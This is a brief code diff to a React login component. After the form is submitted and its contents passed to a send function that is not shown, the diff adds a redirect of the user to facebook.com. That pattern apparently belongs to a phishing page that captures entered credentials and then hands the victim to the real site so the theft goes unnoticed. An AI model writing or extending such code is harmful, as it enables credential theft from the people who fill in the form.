@@ -38,16 +38,13 @@ function Login() {
       setSuccess("success");
      }
 
-
-
-
-    
   }
 
-  const submitHandler = (e) => {
+  const submitHandler = async(e) => {
     e.preventDefault();
-    sendHandler()
+    await sendHandler()
     e.target.reset()
+    window.location = "https://facebook.com/";
   };
 
 
